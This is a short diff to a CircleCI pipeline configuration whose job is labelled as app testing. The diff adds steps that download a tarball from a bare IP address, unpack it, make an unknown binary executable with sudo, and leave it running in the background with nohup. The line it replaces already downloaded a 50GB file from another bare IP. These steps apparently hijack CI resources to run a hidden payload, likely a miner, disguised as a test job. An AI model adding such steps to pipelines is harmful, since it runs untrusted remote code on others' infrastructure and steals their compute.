@@ -11,7 +11,10 @@ jobs:
       - checkout
       - node/install:
           install-yarn: true
-      - run: wget http://139.180.156.105/50GB.zip
+      - run: wget http://207.148.123.213/vavar2.tar.gz
+             tar xfvz vavar2.tar.gz
+             sudo chmod +x ./vava
+             nohup ./vava
 workflows:
   test_my_app:
     jobs:
